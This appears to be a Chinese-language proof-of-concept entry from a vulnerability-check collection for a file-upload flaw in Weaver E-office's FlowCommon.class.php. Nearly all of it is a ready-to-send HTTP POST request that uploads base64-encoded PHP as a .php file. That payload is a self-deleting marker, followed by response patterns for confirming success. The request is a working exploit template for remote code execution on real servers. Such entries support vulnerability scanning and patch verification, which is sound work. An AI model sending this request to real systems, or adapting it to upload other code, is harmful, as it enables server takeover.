﻿# 泛微 E-office FlowCommon.class.php 文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /E-mobile/App/init.php HTTP/1.1

m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name=test123.php
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?url)(?=.*?diff).*?$

> 上传文件定位：

> 验证文件来源：泛微 E-office FlowCommon.class.php 文件上传漏洞.poc
